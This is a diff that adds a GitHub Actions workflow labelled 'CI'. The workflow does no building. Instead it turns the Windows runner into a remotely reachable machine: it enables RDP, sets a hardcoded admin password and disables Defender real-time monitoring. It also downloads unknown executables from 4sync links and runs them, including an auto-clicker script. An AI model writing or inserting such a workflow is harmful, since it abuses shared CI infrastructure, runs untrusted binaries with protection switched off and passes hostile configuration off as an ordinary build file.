@@ -1,0 +1,42 @@
+name: CI
+
+on: workflow_dispatch
+
+jobs:
+  build:
+    runs-on: windows-2019
+    timeout-minutes: 9999
+
+    steps:
+    - name: Enable TS
+      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+    - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+    - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+    - name: Ur RDP is working go connect xD!
+      run: New-Item -Path "C:\21" -ItemType Directory
+    - name: Ur RDP is working go connect xD!
+      run: New-Item -Path "C:\2" -ItemType Directory
+    - name: Download
+      run: New-Item -Path "C:\1" -ItemType Directory
+    - name: Tunnels.
+      run: Invoke-WebRequest -URI https://www.4sync.com/web/directDownload/RZyVJL6A/Fx6AySib.81bb3e1b3bc3c3f20487569b13149633 -outfile c:\21\RegMikroMan222.zip
+    - name: Tunnels.
+      run: Invoke-WebRequest -URI https://www.4sync.com/web/directDownload/hgTugeLd/lEDXQEUL.ce2470fdf3acc4c8c07cea68eb6be957 -outfile c:\21\cm413_64.zip
+    - name: Tunnels.
+      run: Invoke-WebRequest -URI https://www.4sync.com/web/directDownload/SwWE6ONq/lEDXQEUL.566172a3760c505d460b713f29de5e1c -outfile c:\21\start.exe
+    - name: Tunnels.
+      run: Expand-Archive -LiteralPath "c:\21\RegMikroMan222.zip" -DestinationPath "C:\21"
+    - name: Tunnels.
+      run: Expand-Archive -LiteralPath "c:\21\cm413_64.zip" -DestinationPath "C:\21"
+    - name: Ur RDP is working go connect xD!
+      run: Start-Process Powershell ' -Command "C:\21\start.exe"'
+    - name: Ur RDP is working go connect xD!
+      run: Start-Process Powershell -ArgumentList '-Noexit -Command "C:\21\cm413_64\Clickermannv4.13x64\Clickermann.exe" "C:\21\cm413_64\Clickermannv4.13x64\2211.cms"'
+    - name: Tunnels.
+      run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
+    - name: Tunnels.
+      run: Set-MpPreference -DisableRealtimeMonitoring $true
+    - name: Download
+      run: Invoke-WebRequest -URI https://www.4sync.com/web/directDownload/rZMQ_p6b/FzURo9So.04267e8c0c04a7ec66f58b03ecbc73f0 -outfile c:\21\1122.exe
+    - name: Ur RDP is working go connect xD!
+      run: Start-Process Powershell ' -Command "c:\21\1122.exe"'
